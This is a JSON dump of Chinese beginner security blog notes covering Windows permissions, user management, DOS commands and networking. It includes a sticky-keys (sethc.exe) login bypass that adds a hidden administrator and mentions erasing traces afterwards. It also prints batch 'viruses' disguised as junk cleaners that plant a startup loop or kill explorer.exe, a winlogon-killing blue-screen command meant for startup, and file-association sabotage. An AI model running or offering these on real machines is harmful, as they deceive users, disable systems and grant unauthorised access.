－－为不同用户分配空间\n4. 支持单个文件大于4个G\n\n注：16G以下的U盘建议格式化成FAT\n\n# 四、修改NTFS权限\n\n1.　取消继承\n\n作用：取消后，可以任意修改权限列表\n\n方法：文件右键属性－安全－高级－取消第一个对号-选择复制(继承财产)\n\n文件权限|权限内容\n:-:|:-:\n完全控制|拥有读取、写入、修改、删除文件，及特殊权限\n修改|拥有读取、写入、修改、删除文件的权限\n读取和执行|拥有读取，及执行文件的权限\n读取|拥有读取文件的权限\n写入|拥有修改文件内容的权限\n特殊权限|控制文件权限列表的权限\n\n文件夹权限|权限内容\n:-:|:-:\n完全控制|拥有对文件及文件夹读取、写入、修改、删除文件，及特殊权限\n修改|拥有对文件及文件夹读取、写入、修改、删除文件的权限\n读取和执行|拥有对文件夹中的文件下载、读取，及执行文件的权限\n列出文件夹内容 |          可以列出文件夹内容，也就是进得去文件夹          \n读取      |           拥有对文件夹中的文件下载、读取的权限           \n写入      |             拥有在文件夹中创建新的文件的权限             \n特殊权限    |控制文件夹权限列表的权限\n\n2. 权限累加\n\n当用户同时属于多个组，允许权限是可以累加的\n\n案例：用户a同时属于A组和B组，A组可读取，B组可写入，则用户a最终权限是即可读取也可写入\n\n3. 拒绝最大 (即优先)\n\n当用户权限累加时，遇到拒绝权限，拒绝优先，结果就是无法使用该权限\n\n案例：用户a和用户b属于A组，A组拥有读取权限，但单独为用户a设置读取权限的拒绝，那么用户a无法读取，用户b可以读取\n\n4. 取得所有权\n\n默认只有administrator有这个权限 ！\n\n作用：可以将任何文件夹的所有者改为administrator\n\n5. 强制继承\n\n作用：对下(以下文件)强制继承父子关系！\n\n方法：文件夹右键属性－安全－高级－勾上第二个对号即可\n\n使用场景：当一个文件夹内的一些子文件经过修改权限时，想要使所有子文件权限统一于父文件，可以通过此方法将文件夹的权限强制替换掉原来子文件的权限\n\n6. 文件复制剪切对权限的影响\n\n文件复制后，跨分区移动，文件的权限会被目标文件覆盖\n\n文件同分区移动，文件的权限不会被目标文件覆盖","tags":["网络安全"],"categories":["网络安全"]},{"title":"day03 - 破解系统密码","url":"/2020/08/03/day03-Crack-system-password/","content":"\n\n# 一、利用5次shift漏洞破解win7密码\n\n1. 漏洞\n    - 漏洞1：未登陆系统前连按5次shift弹出程序（粘滞键）\n      程序位置：c:\\windows\\system32\\sethc.exe\n    \n    - 漏洞2：部分win7及win10系统在未进入系统时，可以通过系统修复漏洞篡改系统文件名！\n\n    - 注：如果win7或win10已修补此漏洞2，则无法利用\n\n    <!-- more -->\n    \n    ---\n    \n2. 破解过程相关知识\n    - cmd工具路径                   c:\\windows\\system32\\cmd\n    - 用户/账户密码存储位置   c:\\windows\\system32\\config\\SAM\n    - 修改账户密码                   net  user 用户名 新密码\n\n    ---\n\n3. 漏洞利用过程\n- 案例：破解win7系统密码\n  - 实验步骤：\n  1. 开启win7虚拟机，开机，随便设置一个密码\n     可用 net user Barry sad#adhk&*hkadb13asd45 设置\n\n  2. 关机后开机，进入登录页面，鼠标进入虚拟机，连按 shift 5次，弹出对话框，说明存在 漏洞1：5次shift漏洞 \n\n    该程序的位置：c:\\windows\\system32\\sethc.exe（突破口：将其替换）\n\n  ![Untitled](..\\assets\\posts\\day03-Crack-system-password\\Untitled.png)\n\n  3. 若存在漏洞，则关机再开机，在出现windows启动界面(四个小点汇聚成旗)时，强制关机(把虚拟机电源拔了，虚拟机右键选择电源—关闭客户机)\n\n  4. 再开机，如果没有出现以下界面，再强制关机一次\n      （win7 一般两次，win10 一般三次）\n      选择启动修复（漏洞在此哦）\n\n  ![Untitled 1](..\\assets\\posts\\day03-Crack-system-password\\Untitled 1.png)\n  进入 “ 启动修复 ” 界面\n\n  ![Untitled 2](..\\assets\\posts\\day03-Crack-system-password\\Untitled 2.png)\n\n\n  5. 出现系统还原提示，点击取消，然后它继续尝试修复，等待几分钟\n\n      ![Untitled 3](..\\assets\\posts\\day03-Crack-system-password\\Untitled 3.png)\n\n      出现问题原因，如以下界面，点击查看详细信息\n\n      ![Untitled 4](..\\assets\\posts\\day03-Crack-system-password\\Untitled 4.png)\n\n  6. 在详细信息中，点击最后一个 txt 文档 的链接，进入记事本\n\n      ![Untitled 5](..\\assets\\posts\\day03-Crack-system-password\\Untitled 5.png)\n\n      ![Untitled 6](..\\assets\\posts\\day03-Crack-system-password\\Untitled 6.png)\n\n      选择文件 — 另存为 (或打开)，进入以下界面，此时就是在最高权限下查看所有文件\n\n      ![Untitled 7](..\\assets\\posts\\day03-Crack-system-password\\Untitled 7.png)\n\n  ![Untitled 8](..\\assets\\posts\\day03-Crack-system-password\\Untitled 8.png)\n\n\n  1. 接下来去寻找 5次shift启动的粘滞键程序\n      - 位置： c:\\windows\\system32\\sethc.exe    \n      将其替换为cmd程序\n      - 位置： c:\\windows\\system32\\cmd\n      注：此时我们要找的C盘在system权限下其实是D盘\n      - 进入D盘，进入windows中的system32中，选择显示所有文件\n      找到 sethc  ，将其重命名（任意），如sethc-bak\n      找到 cmd   ，复制一份cmd，改名为sethc\n      此时基本已经成功，再次开机使调用sechc时就是调用cmd了\n\n      ![Untitled 9](..\\assets\\posts\\day03-Crack-system-password\\Untitled 9.png)\n\n  ![Untitled 10](..\\assets\\posts\\day03-Crack-system-password\\Untitled 10.png)\n\n  8. 全部关闭，重新启动，回到登录界面\n     \n      连按5次shift ，cmd窗口就被调用出来了\n      接下来可以为所欲为了，要想进入有以下两种方法\n        - 若想修改该用户的密码：\n          net user 用户名  新密码\n          用户名在登录界面可以看到，若不想设密码，可以输入“”，置空\n        - 若不想修改该用户的密码：\n          net user test 123 /add                               #新建用户，设置密码\n          net localgroup administrators test /add   #升权为管理员\n          做完该做的事之后......\n          net user test /del                                      #删除用户，擦除数据\n          注：还需删除日志，今后会提到，此处暂未提及\n\n# 二、利用PE破解系统密码\n\n- Windows PE：Windows Preinstallation Environment，Windows预安装环境，是带有有限服务的最小Win32子系统，基于以保护模式运行的Windows XP Professional及以上内核。\n- 功能：包括运行Windows安装程序及脚本、连接网络共享、自动化基本过程以及执行硬件验证所需的最小功能\n- 使用极其简单：\n    - 下一个PE工具，插入U盘，将系统装入，开启目标系统电脑，在刚开机使按相应方法进入BIOS界面(Basic Input Output System,基本输入输出系统)\n        - 真实机一般狂摁某个按键，如Esc，F1等\n        - 虚拟机，进入下拉菜单，点击 打开电源时进入固件\n    - 到BOOT页面下选择U盘或是光驱启动，F10保存，退出BIOS，进入PE系统，点击 破解Windows登录密码\n    - 软件自动定位到C:\\WINDOWS\\SYSTEM32\\CONFIG\\SAM\n    打开后选择用户，更改口令，输入新密码，若不输入，则不设密码\n    保存更改，破解成功\n\n原理：SAM保存着所有用户的账号和密码hash值，我们要做的就是进入SAM文件，用 我们要设置的新密码的hash值 替换 针对账号的密码hash值","tags":["网络安全"],"categories":["网络安全"]},{"title":"day03 - 用户与组管理 | 远程管理","url":"/2020/08/03/day03-Remote administration/","content":"\n# 服务器系统版本介绍\n\n- windows服务器系统：win2000 win2003 win2008 win2012\n\n- linux服务器系统：Redhat(收费)   Centos(免费)  同一家公司\n\n  <!-- more -->\n\n# 一、用户管理\n\n1. 用户概述\n    - 每一个用户登陆系统之后，拥有不同的操作权限\n    - 每一个账户都有自己唯一的 SID（安全标识符）\n    - 用户SID：S-1-5-21-426206823-2579496042-14852678-500\n\n        系统SID：S-1-5-21-426206823-2579496042-14852678\n\n        > 用户UID：500\n        windows系统管理员 administrator 的默认UID是 500\n        普通用户的UID从 1000 开始\n           linux    系统管理员        root         的默认UID是 0\n        普通用户是1000开始\n\n    - 注：不同账户拥有不同的权限，为不同账户赋权限也就是为不同账户的SID赋权，而不是单指表面的用户名\n    - 查看SID：\n    whoami             查看主机名和当前用户名\n    whoami /user    查看主机名、当前用户名，以及SID\n    - 用户密码储存位置：C:\\Windows\\System32\\config\\SAM \n    hash哈希加密算法 (单项加密，无法解密，只能得到校验码)\n    破解方法：暴力破解 撞库\n    - windows 服务器用户默认密码最长有效期为 42 天\n\n    ---\n\n2. 内置账户\n    - 给人使用的账户：\n\n        administrator                        #管理员账户\n\n        guest                                     #来宾账户 权限极低，一般系统默认禁用\n\n    - 计算机服务组件相关的系统账号\n\n        system                                    #系统账户        == 最高权限\n\n        local services                           #本地服务账户 == 普通权限\n\n        network services                     #网络服务账户  == 普通权限\n\n    ---\n\n3. 配置文件\n    - 每个用户都有自己的配置文件，在第一次登陆产生\n    - 路径：\n\n        win7/win2008     c:\\用户\\\n\n        xp/win2003         c:\\Documents and Settings\\\n\n        可以利用系统变量 %usersprofile% 获取当前用户路径\n\n    ---\n\n4. 用户管理命令\n\n    ```jsx\n    net user\t\t\t                  #查看用户列表\n    net user 用户名                 #查看用户信息 \n    net user 用户名 密码\t\t        #更改密码     （服务器中仅管理员）\n    net user 用户名 密码  /add      #创建一个新用户（服务器中仅管理员）\n    net user 用户名 /del\t          #删除一个用户  （服务器中仅管理员）\n    net user 用户名 /active:yes/no  #激活或禁用用户（服务器中仅管理员）\n    ```\n\n# 二、组管理\n\n1. 组概述\n    - 组的作用：简化权限的赋予\n    - 赋权方式：\n        - 用户---组---赋权限\n        - 用户---赋权限\n2. 内置组\n    - 内置组的权限默认已经被系统赋予\n\n    ```jsx\n    1. administrators\t\t\t# 管理员组\n    2. guests\t\t\t\t      # 来宾组\n    3. users\t\t      \t\t# 普通用户组，默认新建用户所在组\n    4. network\t\t\t    \t# 网络配置组\n    5. print\t\t\t      \t# 打印机组\n    6. Remote Desktop\t\t\t# 远程桌面组\n    ```\n\n3. 组管理命令\n\n    ```jsx\n    net localgroup\t\t\t              #　查看组列表\n    net localgroup 组名 \t          \t#  查看该组的成员\n    net localgroup 组名 /add\t\t      # 创建一个新的组\n    net localgroup 组名 /del\t    \t  # 删除一个组\n    net localgroup 组名 用户名 /add \t# 添加一个新用户到组\n    net localgroup 组名 用户名 /del   # 从组中删除用户\n    ```\n\n# 三、服务器远程管理\n\n- mstsc                        #远程桌面程序\n    - 步骤\n    1.首先配置网络，并实现客户机与服务器可以互通 (ping得通)\n    2.服务器开启允许远程控制：我的电脑属性 — 远程设置 — 选择允许 — 确定\n    3.客户机上：运行窗口输入 mstsc 打开远程连接工具\n    4.在mstsc工具上输入服务器的IP ，点击确定\n    5.输入服务器的账号密码\n    注：如使用非管理员账户登陆，需要在服务器上将用户加到 远程桌面内置组 Remote Desktop Users 中\n- telnet IP                  #cmd中实现远程控制\n    - 在cmd上输入telnet IP \n    输入服务器的账号密码\n    注：如使用非管理员账户登陆，需要在服务器上将用户加到 TelnetClients 中\n- netstat -an                #查看本机开放的所有端口\n\n    > 一些特殊端口：telnet：23远程桌面协议RDP：3389","tags":["网络安全"],"categories":["网络安全"]},{"title":"day03 - 批处理与病毒","url":"/2020/08/03/day03-bat&virus/","content":"\n\n- 批处理作用：自上而下成批处理每一条DOS命令，直到执行到最后一条。\n\n# 如何创建批处理：\n\n- 扩展名：.bat\n- 创建方法：创建一个记事本文件，然后将其扩展改为.bat\n- 运行环境：cmd  (cmd.exe)\n\n<!-- more -->\n\n# **基本命令**\n\n- echo：输出信息\n\n    > @echo off：关闭回显（屏蔽执行过程）只显示结果\n     echo.       ：输出空行\n\n---\n\n- pause：暂停批处理运行\n- cls     ：清屏\n\n---\n\n- color <颜色代码> ：\n改dos界面颜色，背景色+文字颜色，如0a\n\n---\n\n![Untitled](..\\assets\\posts\\day03-bat&virus\\Untitled.png)\n\n- title <标题内容>                 ：给批处理脚本设置标题\n\n---\n\n- > nul(：隐藏结果) 2> nul  (：隐藏错误信息)\n\n---\n\n- md 路径+文件名                ：建立目录\n\n---\n\n- rd  (参数) 文件路径             ：删除目录\n  #参数 /s 除目录本身外还删除其下的所有子目录和文件参数 \n  /q 安静模式，带 /s 删除目录树时不要求确认\n\n---\n\n- cd 路径                                ：进入目录\n# cd\\ 回到根目录   |    cd.. 回到上级目录\n\n---\n\n- goto <区块名>：跳转到一个命令区块继续运行\n#用 :<区块名> 来声明一个区块例如： :7749 就声明了一个名为 7749 的区块\n\n---\n\n- set (可选参数) <变量名> = 变量值\n#参数 /p , 程序暂停等待用户输入，变量的值就等于用户输入\n例如：set /p a = 请输入变量 a 的值：，不加 /p 的话就是直接赋值\n- %<变量名>% ,如%u%          #引用变量，提取变量的值\n- 典例\n\n    ```jsx\n    @echo off         \n    color 0a             \n    title 批处理小程序v1.0     \n     \n    :menu\n    cls\n    echo ==========================\n    echo               菜单\n    echo         1、修改管理员密码\n    echo         2、定时关机\n    echo         3、查看本机IP\n    echo         4、退出本程序\n    echo ===========================\n     \n    set /p num=请输入选项：   \n    if \"%num%\"==\"1\" goto 1\n    if \"%num%\"==\"2\" goto 2\n    if \"%num%\"==\"3\" goto 3\n    if \"%num%\"==\"4\" goto 4\n    echo 请正确输入数值，按任意键继续！\n    pause\n    goto menu\n     \n    :1\n    set /p u=请输入用户名:\n    set /p p=请输入新密码:\n    net user %u% %p%   >nul  \n    echo 您的密码已经设置成功!按任意键返回菜单!\n    pause\n    goto menu\n    #注解：net user 用户名 密码 #修改账户密码（windows所有平台支持）\n           >nul     #清除系统反馈，如命令成功完成...\n    :2\n    set /p time=请输入时间：\n    shutdown -s -t %time%  \n    set /p x=是否取消（Y：是，N：否）：\n    if \"%x%\"==\"Y\" shutdown -a\n    echo 执行完毕，按任意键返回菜单!\n    pause\n    goto menu\n    \n    :3\n    ipconfig\n    echo 按任意键返回菜单!\n    pause\n    goto menu\n    \n    :4\n    exit\n    ```\n\n---\n\n## 简单病毒\n\n- 批处理文件一\n\n    功能：伪装垃圾清理程序，添加到开机自启，无限弹出cmd窗口\n\n    ![Untitled 1](..\\assets\\posts\\day03-bat&virus\\Untitled 1.png)\n\n    ```jsx\n    @echo off\n    title 系统垃圾清理\n    color 2f\n    echo =======若杀毒软件恶意拦截，请选择【允许程序的所有操作】========\n    echo.\n    echo.\n    echo :a>c:\\windows\\zuosi.bat\n    echo start>>c:\\windows\\zuosi.bat\n    echo goto a>>c:\\windows\\zuosi.bat\n    copy c:\\windows\\zuosi.bat \"%USERPROFILE%\\「开始」菜单\\程序\\启动\" >nul\n    #此处的系统启动菜单为win 2003下的，不同系统有所不同\n    echo.\n    echo   ====== 垃圾清理中，请不要关闭窗口======\n    echo.\n    ping -n 5 127.0.0.1 >nul  #运行几秒，骗过用户\n    echo.\n    echo   ====== 垃圾清理完毕，共清理垃圾500M===\n    echo.\n    echo.\n    echo   ====== 建议立即重启电脑\n    echo   按任意键关闭！\n    pause\n    exit\n    ```\n\n---\n\n- 批处理文件二（纯恶搞）\n\n    功能：伪装垃圾清理程序 强制终止桌面进程\n\n    - taskkill /im explorer.exe /f >nul 2>nul\n    - taskkill：杀死进程   |   /im 进程名：指定杀死哪个进程    |   /f ：强制\n\n    ```jsx\n    @echo off\n    title 系统垃圾清理\n    color 2f\n    echo ====== 若有杀毒软件恶意拦截，请选择【允许程序的所有操作】=====\n    echo.\n    echo.\n    echo ====== 垃圾清理中，请不要关闭窗口=======\n    echo.\n    ping -n 5 127.0.0.1 >nul\n    taskkill /im explorer.exe /f >nul 2>nul\n    echo.\n    echo. ===== 完了，你系统废了======\n    ping -n 5 127.0.0.1>nul\n    echo.\n    start c:\\windows\\explorer.exe           #打开进程\n    echo.\n    echo ====== 已经修复好了！是不是吓坏了！！嘿嘿=========\n    pause\n    ```\n\n---\n\n- 简易蓝屏炸弹 - 针对win 2003\n\n    ```jsx\n    ntsd -c q -pn winlogon.exe\n    ```\n\n    - ntsd      ：杀死进程\n    ntsd -c q -pn 进程名：强制杀死指定进程\n    - 蓝屏原因：\n           winlogon.exe为windows登录进程，在开机后就已经登录成功且处于使用状态，无法杀死，而命令想强制杀死，系统不让，结果导致蓝屏\n    - 作死使用方法：将该命令写成一个批处理放到系统启动文件夹下\n    结果    😈       ：开机就蓝屏\n\n---\n\n- 简易小脚本\n    - 方法：写命令到txt，将扩展名改为.vbs\n\n    ```jsx\n    do\n    msgbox \"啦啦啦！\"\n    loop\n    ```\n\n    - 效果       ：加上do-loop后变为死循环，窗口无法关闭\n    解决方法：vbs 使用微软自带的wscript.exe来编写的\n    - 注：可以用修改软件图标，使vbs文件伪装得更好\n\n    ![Untitled 2](..\\assets\\posts\\day03-bat&virus\\Untitled 2.png)\n\n    - 升级小脚本（并没有什么用😒）\n\n        ```jsx\n        do\n        msgbox \"小哥我最帅！\"\n        msgbox \"小子，你对这件事有异议吗\"\n        msgbox \"你要为此付出代价\"\n        msgbox \"从现在开始我要求你点100下鼠标\"\n        msgbox \"100\"\n        msgbox \"99\"\n        msgbox \"98\"\n        msgbox \"97\"\n        msgbox \"96\"\n        msgbox \"95\"\n        msgbox \"94\"\n        msgbox \"93\"\n        msgbox \"92\"\n        msgbox \"91\"\n        msgbox \"90\"\n        msgbox \"....\"\n        msgbox \"3\"\n        msgbox \"2\"\n        msgbox \"1\"\n        msgbox \"如果你看到这里，说明你确实很执着，你感动了我，请再点一下\"\n        msgbox \"年轻人，有时候执着也没用，换个姿势再来一次\"\n        loop\n        ```\n\n---\n\n- 整人网页\n\n    ```jsx\n    <!DOCTYPE html>\n    <html>\n    <head>\n    \t<meta charset=\"utf-8\">\n    \t<meta http-equiv=\"X-UA-Compatible\" content=\"IE=edge\">\n    \t<title>很恶心的常见整人效果的代码</title>\n    \t<link rel=\"stylesheet\" href=\"\">\n    </head>\n    <body>\n    \t<a href=\"\" onmouseover=\"alert('飞哥真帅');\n    alert('飞哥真帅');\n    alert('飞哥是真帅');\n    alert('飞哥是真帅');\n    alert('飞哥是真的帅');\n    alert('同意不！');\n    alert('不同意？');\n    alert('去死吧');\n    \t\">不许把鼠标移到这里！</a>不敢了吧！！！\n    </body>\n    </html>\n    ```\n\n    测试效果：\n\n    ![Untitled 3](..\\assets\\posts\\day03-bat&virus\\Untitled 3.png)\n\n","tags":["网络安全"],"categories":["网络安全"]},{"title":"day02 - 基本DOS命令","url":"/2020/08/02/day02-DOS/","content":"\nTab + 向上   自动补全       |       Ctrl + C     强制终止命令\n\n---\n\n# 基本命令\n\n> cd..                         返回上级目录\ncd\\                         返回根目录\nd:                            进入D盘\ncls                           清空所有dos操作\ndir                           显示当前盘符文件信息\nrd . /s/q                   清空磁盘\n\n---\n<!-- more -->\n# 浏览文件信息\n\n> type 文件名.扩展名                 显示\ntype 文件名.扩展名 | more      分页显示\n例如：dir c:\\windows | more  \n(任何命令，只要输出过多都可以用 后缀 | more 分页显示,按空格输出下一页)\n\n---\n\n# 创建文件\n\n> echo world is so amazing !           输出到屏幕\necho 字符串 >test.txt                    输出到文件，覆盖\necho 字符串 >>c:\\test.txt              输出到文件，追加\n                                                      若文件不存在，则创建该文件\n\n> copy con 文件名.扩展名 \ncon可暂时理解为屏幕，即在dos窗口中写内容，然后保存到指定文件\n输入命令后回车开始编写   ，  Ctrl + Z ，回车结束编写\n\n---\n\n# 删除文件\n\n> del 文件名.扩展名               删除该文件\ndel *.txt                               删除所有 txt/··· 结尾的文件\ndel *.*                                  删除所有文件\ndel *.* /s/q                          无提示删除所有文件\n                                            /s 所有根目录\n\n---\n\n# 文件夹\n\n> md 文件名                           创建文件夹\nattrib +h 文件名                  隐藏文件夹\nattrib -h 文件名                   取消文件夹\nattrib +h +s +a 文件名        将文件夹隐藏设为受保护的系统文件夹\ndir /a                                    显示当前磁盘所有文件，包括系统文件\n\n快速生成一个指定大小的空文件，若将其恶意隐藏为系统文件，一般较难发现\n\n> fsutil file createnew c:\\system.ini 1024000000\n在c盘创建1G的空文件\n\n---\n\n# 复制和移动\n\n> copy  源文件地址  目的地址       复制源文件到目的地址\n如：D :\\ test \\ a > copy  hello.txt   ..\\b\\ \n       将test中的a文件夹下的hello.txt 复制到 test 的b文件夹下\n       D :\\ test \\ a > copy \\test\\b\\hello.txt  .\\\n       将b文件夹下的hello.txt 复制到 当前文件夹 a中\nmove 源文件地址  目的地址       移动源文件到目的地址\nren     旧名  新名                          重命名\n\n---\n\n# 修改关联\n\n> 下毒：\nassoc .txt=exefile                  将.txt文件作为.exe文件打开\n                                              修改打开txt文件的程序 使其无法打开\n解药：\nassoc .txt=txtfile                    恢复关联\n\n---\n\n# 关机\n\n> shutdown -s -t 100                      定时关机，单位秒\nshutdown -s -f -t 秒                    定时强制关机，无任何保存提示\nshutdown -s -f -t 秒 -c \"别玩儿啦，洗洗睡吧！\"\nshutdown -r -t 秒                        定时重启\nshutdown -a                                取消一切定时\nshutdown -l                                 注销，同logoff命令相同","tags":["网络安全"],"categories":["网络安全"]},{"title":"day02 - IP地址详解","url":"/2020/08/02/day02-IP/","content":"\n# 局域网\n\n- 局域网：一般称为内网\n- 单局域网的构成：交换机、网线、PC (其他IT终端)\n- 交换机：用来组建内网的局域网的设备（硬件上有很多网口）\n\n<!-- more -->\n\n# 子网掩码\n\n- IP 地址构成：网络位 + 主机位       | 32位二进制，x.x.x.x  0≤ x ≤ 255\n- **局域网通信规则**：所有人必须都在**同一网段内**(网络位相同)才能通信\n- **子网掩码**：用来确定网络位，与 255 对应的是网路位，与 0 对应的是主机位\n\n    > 例如：192.168.0.X，前 3 位是网络位，最后一个是主机位\n    属于 192.168.0.0 网段，名字是 .X，子网掩码就是 255.255.255.0\n\n# IP地址详解\n\n- ISO定义五大类：（以IP地址的第一位进行区分）\n    - A 类：1    - 126 默认子网掩码：255.0.0.0\n    - B 类：128 - 191 默认子网掩码：255.255.0.0\n    - C 类：192 - 223 默认子网掩码：255.255.255.0\n    - D 类：224 - 239 组播地址\n    - E 类： 244 - 254 科研使用\n\n    注：目前我们只能使用A、B、C类 但A、B、C类子网掩码可以修改\n\n- 几种特殊的 IP 地址：\n    - 本机 IP ：127.0.0.1\n    - 广播地址：主机位全为 255\n    - 网段：主机位全为 0\n\n        > 主机位不能全为0和255\n\n# 网关\n\n- 网关：一个网络的出口，Gateway=GW，一般网关在路由器上（占一个IP）\n\n    一般是 IP地址 的**最后一位**或者是**第一位**\n\n- 路由器：可以连接外网的设备\n\n> PC向外发包的心理活动\n1、首先判断目标IP与自己是否在 同一个网段\n2、如在同一个网段，则直接发出去，不找网关\n3、如不在同一个网段，则发包给网关\n\n# DNS\n\n**DNS：Domain Name Service 域名服务 |** DNS服务器在公网上，也有IP，由厂商提供\n\n> 输入域名后，浏览器的心理活动\n1、先到本地**DNS缓存**上找\n2、如**DNS缓存**中没找到，则到**本地解析文件**上找\n3、如**本地解析文件**中还是没找到，则请求**DNS服务器**帮助\n\n- 测试网络连通性：**Ctrl+C 可终止 ping**             \n有去有回即为可以成功通路，若请求超时则说明**对方不在线，网络不连通**或**防火墙拦截**\n    - ping 目标IP地址              |  测试网络连通性\n    - ping -t  目标IP地址          |  一直ping\n    - ping -n 数字 目标ip地址 |  修改ping包的数量（默认4）\n    - ping -l   数字 目标ip地址  |  修改ping 包的字节数\n\n- 手工解析域名：\n    - nslookup www.baidu.com\n\n    获得DNS服务器IP：192.168.0.1\n    获得域名的IP：180.97.34.96  ,   .94\n\n![Untitled](D:\\GitHub\\myblog\\source\\assets\\posts\\day02-IP\\Untitled.png)\n\n- 查看本地IP：可双击网卡，ipv4协议   |   或用命令\n    - ipconfig        |  查看ip基本信息\n    - ipconfig /all   |  查看ip所有信息\n\n---","tags":["网络安全"],"categories":["网络安全"]}]